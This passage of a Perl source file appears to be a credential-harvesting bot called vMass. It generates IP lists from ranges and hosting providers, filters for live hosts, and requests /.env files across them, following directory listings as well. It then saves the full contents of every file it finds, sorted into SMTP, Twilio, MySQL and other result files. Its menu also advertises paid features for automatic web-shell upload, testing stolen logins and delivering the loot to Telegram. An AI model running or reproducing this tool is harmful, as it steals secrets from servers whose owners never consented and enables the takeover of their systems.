    elsif ( $choice eq '1' ) {
        my $ip = new Net::IP($range) or die( Net::IP::Error() );
        my $size = $ip;
        do {
            open( $IPs, '>>', 'IPs.txt' );
            print color("bold green");
            print $IPs "http://" . $ip->ip(), "\n";
            print color("reset");
            close($IPs);
            print color("bold green");
            print( $ip->ip(), "\n" );
            print color("reset");
        } while ( ++$ip );

        print color("bold blue");
        print "IPs Fetched: " . $size->size(), "\n";
        print "Back To Menu in 3 Seconds.\n";
        sleep(3);
        Menu();
    }
    else {
        GenerateHostingRange();
    }
}

sub GenerateFromList {
    print color("bold red");
    print
"Important: urls in list must be domain.com format only (example: google.com)\n";
    print "\n";
    print color("reset");
    print color("bold blue");
    print "Enter path to your list (example: list.txt)\n";
    print "\n";
    print color("reset");
    print "0: Back To Menu\n";
    print "> ";
    my $name = <STDIN>;
    chomp($name);
    my @ranges = ();

    if ( $name eq '0' ) {
        Menu();
    }

    open( FH, '<', $name ) or die "Could not open your list file !";
    while (<FH>) {
        my $url = $_;
        chomp($url);
        my $q = $res->query($url);

        #get ranges
        if ($q) {
            for ( $q->answer ) {
                print $_->address, "\n" if $_->type eq 'A';
                my $tmp = $_->address;
                my @sip = split( '\.', $tmp );
                my $ar  = @sip[0] . '.' . @sip[1] . '.' . @sip[2] . '.0/24';
                push( @ranges, $ar );
            }
        }
    }

    close(FH);

    #got all ranges, generate now
    foreach (@ranges) {
        my $ip   = new Net::IP($_);
        my $size = $ip;
        do {
            open( $IPs, '>>', 'IPs.txt' );
            print color("bold green");
            print $IPs "http://" . $ip->ip(), "\n";
            close($IPs);
            print( $ip->ip(), "\n" );
            print color("reset");
        } while ( ++$ip );
    }
    print color("bold blue");
    print "Done Getting IPs from List\n";
    print "Back To Menu in 3 Seconds.\n";
    sleep(3);
    Menu();
}

#Get Lists from IPrange
sub GenerateFromRange {
    print color("bold blue");
    print "Generate from Range\n";
    my @ranges = ();
    print @ranges;
    print "How many IP Ranges ?\n";
    print color("reset");
    print "> ";
    my $num = <STDIN>;
    chomp $num;

    for ( my $i = 0 ; $i < $num ; $i++ ) {
        print color("bold blue");
        print "IP RANGE Number: " . ( $i + 1 ) . "\n";
        print "Insert IPv4 Range ( example: 82.223.9.0/24 )\n";
        print color("reset");
        print "> ";
        my $rep = <STDIN>;
        chomp $rep;
        push( @ranges, $rep );
    }
    print color("blue");
    print "Gettings IPs from Range\n";
    print color("reset");
    # GET IPs From IP RANGE + SAVE + FORMAT
    foreach (@ranges) {
        my $ip   = new Net::IP($_);
        my $size = $ip;
        do {
            open( $IPs, '>>', 'IPs.txt' );
            print color("bold green");
            print $IPs "http://" . $ip->ip(), "\n";
            close($IPs);
            print( $ip->ip(), "\n" );
            print color("reset");
        } while ( ++$ip );

        print color("bold blue");
        print "IPs Fetched: " . $size->size(), "\n";
        print "Back To Menu in 3 Seconds.\n";
        sleep(3);
    }
    Menu();
}

sub CheckLiveIPs() {
    print color("bold blue");
    print "1: Check IPs.txt\n";
    print "2: Check Custom List\n";
    print color("reset");
    my $list = "";
    my $rep  = <STDIN>;
    chomp($rep);
    if ( $rep eq '1' ) {
        $list = "IPs.txt";
    }
    elsif ( $rep eq '2' ) {
        print color ("bold blue");
        print "Enter path to your list\n";
        print "> ";
        my $res = <STDIN>;
        chomp $res;
        $list = $res;
        print color ("reset");
    }
    else {
        Menu();
    }

    #Set Check Speed
    $ua->timeout(1);

    # Check IPs Status and Filter
    open( my $fh, "<", $list ) or die "Could not open List File";
    while ( my $line = <$fh> ) {
        my $response = $ua->get($line);

        if ( $response->is_success ) {
            open( my $good, '>>', "LiveIPs.txt" );
            print $good $line;
            close $good;
            #### console output ###
            print color ("bold green");
            print $line. "Ok\n";
            print color ("reset");
        }
        else {
            open( my $bad, '>>', "badIPs.txt" );
            print $bad $line;
            close $bad;

            #### console output ###
            print color ("bold red");
            print $line. "Down\n";
            print color ("reset");
        }
    }
    close($fh);
    #### empty IPs.txt ####
    open( my $fh, ">", "IPs.txt" ) or die "Could not open IPs.txt";
    close($fh);

    #return to menu
    print color ("bold blue");
    print "Done Checking IPs\n";
    print "Back To Menu in 3 seconds\n";
    sleep(3);
    Menu();
}

sub BasicEnvCheck() {

    print color("bold blue");
    print "1: Check LiveIPs.txt\n";
    print "2: Check Custom List\n";
    print color("reset");
    my $list = "";
    my $rep  = <STDIN>;
    chomp($rep);
    if ( $rep eq '1' ) {
        $list = "LiveIPs.txt";
    }
    elsif ( $rep eq '2' ) {
        print color ("bold blue");
        print "Enter path to your list\n";
        print "> ";
        my $res = <STDIN>;
        chomp $res;
        $list = $res;
        print color ("reset");
    }
    else {
        Menu();
    }

    print "Checking all possible /.env paths\n";
    ### Start Enumeration - Basic Mode
    open( my $fh, "<", $list ) or die "Could not open your List file";
    while ( my $line = <$fh> ) {
        chomp $line;
        $ua->timeout(1);
        my $content = $ua->get( $line . "/.env" )->content;
        if ( $content =~ /smtp|SMTP|twilio|TWILIO/ ) {
            open( my $env, '>>', "envIPs.txt" );
            print $env $line . "/.env\n";
            close $env;
            print color "bold green";
            print "Found .env -> " . $line . "/.env\n";
            print color "reset";
        }
        else {
            $ua->timeout(2);
            my $content = $ua->get($line)->content;
            if ( $content =~ /Index of/ ) {
                DepthEnvCheck($line);
            }
            else {
                print "Checking ..\n";
            }
        }
    }
    close($fh);

    #### empty goodIPs.txt ####
    open( my $fh, ">", "LiveIPs.txt" ) or die "Could not open LiveIPs.txt";
    close($fh);

    #Return To Menu
    print color("bold blue");
    print "Done scanning env paths\n";
    print "Back To Menu in 3 seconds\n";
    print color("reset");
    sleep(3);
    Menu();
}

sub DepthEnvCheck() {

    #get all directoriesq
    my $link = $_[0];

    $mech->get($link);
    my @links = $mech->links();

    for my $dir (@links) {
        if ( $dir->url =~ /\// ) {
            $ua->timeout(1);
            my $content =
              $ua->get( $link . "/" . $dir->url . "/.env" )->content;
            if ( $content =~ /smtp|SMTP|twilio|TWILIO/ ) {
                open( my $env, '>>', "envIPs.txt" );
                print $env $link . "/" . $dir->url . ".env\n";
                close $env;
                print color "bold green";
                print "Found .env ->" . $link . "/" . $dir->url . ".env\n";
                print color "reset";
            }
            else {
                print "Checking ...\n";
            }
        }
    }
}

sub extractTools {

    print "Extracting Tools from envIPs.txt\n";
    open( my $fh, "<", "envIPs.txt" ) or die "Could not open envIPs.txt";
    while ( my $line = <$fh> ) {
        chomp $line;
        $ua->timeout(1);
        my $content = $ua->get($line)->content;

        if ( $content =~ /smtp|SMTP/ ) {
            open( my $env, '>>', "results/SMTP.txt" );
            print $env $content . "\n";
            print $env "---------------\n";
            close $env;
            print color("bold green");
            print "SMTP Extracted !\n";
            print color("reset");
        }

        if ( $content =~ /twilio|TWILIO/ ) {
            open( my $env, '>>', "results/TWILIO.txt" );
            print $env $content . "\n";
            print $env "---------------\n";
            close $env;
            print color("bold green");
            print "TWILIO Extracted !\n";
            print color("reset");
        }

        if ( $content =~ /mysql|MYSQL/ ) {
            open( my $env, '>>', "results/PHPMYADMIN.txt" );
            print $env $content . "\n";
            print $env "---------------\n";
            close $env;
            print color("bold green");
            print "PHPMYADMIN Extracted !\n";
            print color("reset");
        }

        open( my $env, '>>', "results/OtherTools.txt" );
        print $env $content . "\n";
        print $env "---------------\n";
        close $env;
        print color("bold green");
        print "OtherTools Extracted !\n";
        print color("reset");

    }
    close($fh);
    print color("bold blue");
    print "Done extracting\n";
    print "Back To Menu in 3 seconds\n";
    print color("reset");
    Menu();
}

sub updateBot {
    print color("bold blue");
    print "https://github.com/c99tn/vMass\n";
    print "\n";
    print 
"Check the official repository for updates and clone the bot from there, don't forget to drop a star !\n";
    print "\n";
    print
"want to be notified on new updates or new tools ? join the official Telegram Channel below\n";
    print "\n";
    print "https://t.me/+7wraokmFiCcxOTk0\n";
    print "\n";
    print color("reset");
    my $rep = 1;
    do {
        print "0: Back to Menu \n";
        print "> ";
        $rep = <STDIN>;
        chomp($rep);
    } until ( $rep eq '0' );
    Menu();

}

sub proOnly {
    print color("red"), "This feature is only available in the PRO VERSION.\n";
    print 'To upgrade, contact in Telegram: @dpr52  ~  https://t.me/dpr52'
      . "\n", color("reset");
    my $rep = 1;
    do {
        print "0: Back to Menu \n";
        print "> ";
        $rep = <STDIN>;
        chomp($rep);
    } until ( $rep eq '0' );
    Menu();
}

sub Menu {
    CMS_BANNER();
    
    #IPs.txt
    $filename = "IPs.txt";
    $linesIPs = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linesIPs += ($buffer =~ tr/\n//);
    }
    close FILE;

    #LiveIPs.txt
    $filename = "LiveIPs.txt";
    $linesLive = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linesLive += ($buffer =~ tr/\n//);
    }
    close FILE;

    #envIPs.txt
    $filename = "envIPs.txt";
    $linesenv = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linesenv += ($buffer =~ tr/\n//);
    }
    close FILE;

    #SHELL.txt
    $filename = "results/SHELLS.txt";
    $linesshell = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linesshell += ($buffer =~ tr/\n//);
    }
    close FILE;


    #Other.txt
    $filename = "results/OtherTools.txt";
    $linesother = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linesother += ($buffer =~ tr/\n//);
    }
    close FILE;
    
    #PhpMyAdmin.txt
    $filename = "results/PHPMYADMIN.txt";
    $linessphp = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linessphp += ($buffer =~ tr/\n//);
    }
    close FILE;

    #SMTP.txt
    $filename = "results/SMTP.txt";
    $linessmtp = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linessmtp += ($buffer =~ tr/\n//);
    }
    close FILE;
    #TWILIO.txt
    $filename = "results/TWILIO.txt";
    $linestwil = 0;
    open(FILE, $filename) or die "Can't open `$filename': $!";
    while (sysread FILE, $buffer, 4096) {
        $linestwil += ($buffer =~ tr/\n//);
    }
    close FILE;

   #bots stats
    print color("bold red");
    print "Stats:  ";
    print color("reset");
    print "IPs: ";
    print color("bold green");
    print $linesIPs."  ";
    print color("reset");
    print "LiveIPs: ";
    print color("bold green");
    print $linesLive."  ";
    print color("reset");
    print ".env Found: ";
    print color("bold green");
    print $linesenv."  ";
    print color("reset");
    print "Shells Uploaded: ";
    print color("bold green");
    print $linesshell."  ";
    print color("reset");
    print "\/results: ";
    
    if ($linesshell >= 1 || $linessmtp >=1 || $linestwil >=1 || $linessphp >=1 || $linesother >= 1){
        print color("bold green");
        print "available";
        print color("reset");
    }else{
        print color("bold red");
        print "empty";
        print color("reset");
    }
    print "\n";
    print "\n";
    print color("green"), "1:  Generate List from IP Ranges\n", color("reset");
    print color("yellow"),
      "2:  Generate List from dotenv Dorks **PRO VERSION ONLY**\n",
      color("reset");
    print color("green"), "3:  Generate List from URL List\n", color("reset");
    print color("green"),
"4:  Generate List from Random Hosting Range ( AWS, OVH, GoDaddy, HostGator ... ) \n",
      color("reset");
    print color("green"), "5:  Check List ( Filter LIVE/DEAD )\n",
      color("reset");
    print color("green"), "6:  Scan .env Paths\n", color("reset");
    print color("yellow"),
      "7:  Scan .env + CMS Exploits AUTO SHELL UPLOAD **PRO VERSION ONLY**\n",
      color("reset");
    print color("yellow"),
"8:  Scan Framework (Laravel/Symphony) Exploits **SOON ~ PRO VERSION ONLY**\n",
      color("reset");
    print color("green"), "9:  Extract Tools from .env list\n", color("reset");
    print color("yellow"),
      "10: Test SMTP List ( results/SMTP.txt ) **PRO VERSION ONLY** \n",
      color("reset");
    print color("yellow"),
"11: Test Twilio List Balance ( results/TWILIO.txt ) **PRO VERSION ONLY**\n",
      color("reset");
    print color("yellow"),
      "12: PhpMyAdmin AUTO SHELL UPLOAD (WP ONLY!) **PRO VERSION ONLY** \n",
      color("reset");
    print color("yellow"),
"13: Deliver Tested Shells/Tools to Private Telegram Channel **PRO VERSION ONLY** \n",
      color("reset");
    print color("yellow"),
"1337: AUTOPILOT MODE (Generate -> Check -> Scan CMS Exploits + env -> EXTRACT -> Telegram) **PRO VERSION ONLY** \n",
      color("reset");
    print "\n";
    print color("green"), "14: Update\n", color("reset");
    print color("green"), "0:  Exit\n",   color("reset");
    print "\n";
    print "Your Pick: \n";
    print "> ";
    my $choice = <STDIN>;
    chomp $choice;

    if ( $choice eq '1' ) {
        GenerateFromRange();
    }
    elsif ( $choice eq '5' ) {
        CheckLiveIPs();
    }
    elsif ( $choice eq '6' ) {
        BasicEnvCheck();
    }
    elsif ( $choice eq '4' ) {
        GenerateHostingRange();
    }
    elsif ( $choice eq '0' ) {
        exit 0;
    }
    elsif ( $choice eq '3' ) {
        GenerateFromList();
    }
    elsif ( $choice eq '2' ) {
        proOnly();
    }
    elsif ( $choice eq '7' ) {
        proOnly();
    }
    elsif ( $choice eq '8' ) {
        proOnly();
    }
    elsif ( $choice eq '9' ) {
        extractTools();
    }
    elsif ( $choice eq '10' ) {
        proOnly();
    }
    elsif ( $choice eq '11' ) {
        proOnly();
    }
    elsif ( $choice eq '12' ) {
        proOnly();
    }
    elsif ( $choice eq '13' ) {
        proOnly();
    }
    elsif ( $choice eq '14' ) {
        updateBot();
    }
    elsif ( $choice eq '1337' ) {
        proOnly();
    }
    else {
        print "Wrong Option, Pick again!\n";
        Menu();
    }
}
#TEST SMTP
#TWILIO SDK here

#WP EXPLOITS
#Main Menu
GenerateText();
Menu();
